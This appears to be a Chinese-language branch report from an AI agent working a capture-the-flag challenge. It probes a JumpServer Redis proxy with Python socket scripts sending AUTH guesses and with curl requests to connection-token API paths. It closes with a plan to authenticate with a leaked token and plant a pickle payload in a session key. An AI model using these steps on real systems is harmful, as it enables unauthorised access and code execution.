## Branch Result
direction: proxy-token-protocol
subagent_id: branch_004
status: INFEASIBLE

### 发现
- 63790 确认为 JumpServer/Magnus Redis DB Client 代理语义，不是目标 Flask 应用的直连 Redis。
- 正确的 Redis 客户端 AUTH 形式已确认：Redis 协议单参数 `AUTH <connection_token.id>@<connection_token.value>`，对应命令行为 `redis-cli -h <host> -p <port> -a '<uuid>@<value>'`。Redis 模式下用户名为空。
- JumpServer Luna 源码证据：
  - `/tmp/jumpserver-luna/src/app/elements/content/content-window/magnus/magnus.component.ts:64` Redis username 为空。
  - `/tmp/jumpserver-luna/src/app/elements/content/content-window/magnus/magnus.component.ts:67` Redis password 为 `${this.token.id}@${this.token.value}`。
  - `/tmp/jumpserver-luna/src/app/elements/content/content-window/magnus/magnus.component.ts:111-115` 生成 `redis-cli -h ... -p ... -a <password>`。
- JumpServer Core 源码证据：
  - `/tmp/jumpserver-src/apps/authentication/api/connection_token.py:824-832` Magnus/Core 使用 `POST /api/v1/authentication/super-connection-token/secret/`，请求体字段是 `id`。
  - `/tmp/jumpserver-src/apps/authentication/api/connection_token.py:827-829` 该接口需要 `authentication.view_superconnectiontokensecret` 权限。
  - `/tmp/jumpserver-src/apps/authentication/api/connection_token.py:602` token value 是服务端随机生成值，不可从目标域名/cookie 派生。
- 目标 HTTP 站点不暴露 JumpServer Core API：`/api/v1/authentication/super-connection-token/` 和 `/api/v1/authentication/super-connection-token/secret/` 在目标域名和 `117.21.200.176:81` + 正确 Host 下均返回 Flask 404。
- 存在公开的 JumpServer 连接令牌泄露漏洞 CVE-2025-62712/GHSA-6ghx-6vpv-3wg7，但前提是登录真实 JumpServer Web 后访问 super-connection API；本 CTF HTTP 面未暴露 JumpServer 登录/API，会话 cookie 也不是 JumpServer 会话。

### 命令和结果
```bash
python3 - <<'PY'
import socket, uuid, hashlib
HOST='117.21.200.176'; PORT=63790
def resp(*parts):
    out=f'*{len(parts)}\r\n'.encode()
    for p in parts:
        p=str(p).encode()
        out += b'$%d\r\n'%len(p)+p+b'\r\n'
    return out
def once(secret):
    s=socket.create_connection((HOST,PORT),timeout=4); s.settimeout(4)
    s.sendall(resp('AUTH', secret))
    data=s.recv(4096).decode('latin1','replace').strip()
    s.close(); return data
u=str(uuid.UUID('00000000-0000-0000-0000-000000000000'))
hex64=hashlib.sha256(b'x').hexdigest()
for name,val in [('uuid_at_hex64', f'{u}@{hex64}'), ('hex64_at_uuid', f'{hex64}@{u}'), ('bare_uuid', u)]:
    print(name, '=>', once(val)[:500])
PY
```

结果：
```text
uuid_at_hex64 => -POST http://core:8080/api/v1/authentication/super-connection-token/secret/ failed, get code: 404, {"detail":"ConnectionToken对象不存在","code":"object_does_not_exist"}
hex64_at_uuid => -POST http://core:8080/api/v1/authentication/super-connection-token/secret/ failed, get code: 500, {"error": "Server internal error"}
bare_uuid => -invalid secret
```

```bash
python3 - <<'PY'
import socket
HOST='117.21.200.176'; PORT=63790
def resp(*parts):
    out=f'*{len(parts)}\r\n'.encode()
    for p in parts:
        p=str(p).encode(); out+=b'$%d\r\n'%len(p)+p+b'\r\n'
    return out
secret='00000000-0000-0000-0000-000000000000@0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
s=socket.create_connection((HOST,PORT),timeout=4); s.settimeout(4)
for cmd in [resp('AUTH',secret), resp('PING')]:
    s.sendall(cmd)
    print(s.recv(4096).decode('latin1','replace').strip())
s.close()
PY
```

结果：
```text
-POST http://core:8080/api/v1/authentication/super-connection-token/secret/ failed, get code: 404, {"detail":"ConnectionToken对象不存在","code":"object_does_not_exist"}
-need auth
```

```bash
curl -i -sS --max-time 10 \
  http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/api/v1/authentication/super-connection-token/
curl -i -sS --max-time 10 -X POST \
  http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/api/v1/authentication/super-connection-token/secret/ \
  -H 'Content-Type: application/json' --data '{"id":"9bc98ac1fbf88cb6911b31bb"}'
```

结果：两者均为 `HTTP/1.1 404 Not Found`，由目标 Flask/openresty 站点返回，不是 JumpServer Core API。

### 结论
不可行。该分支确认了正确代理 AUTH 语法和判断方式，但没有发现可从当前 CTF HTTP 面非暴力获得 `connection_token.id` + `connection_token.value` 的途径，也没有 Redis 写入 primitive。

若主线后续能从其他方向泄露 JumpServer/Luna 连接令牌，下一步应直接用：

```text
AUTH <connection_token_uuid>@<connection_token_value>
```

或：

```bash
redis-cli -h 117.21.200.176 -p 63790 -a '<connection_token_uuid>@<connection_token_value>'
```

认证成功后再执行 `SET session:<ctf_cookie_uuid> <pickle_payload>`。
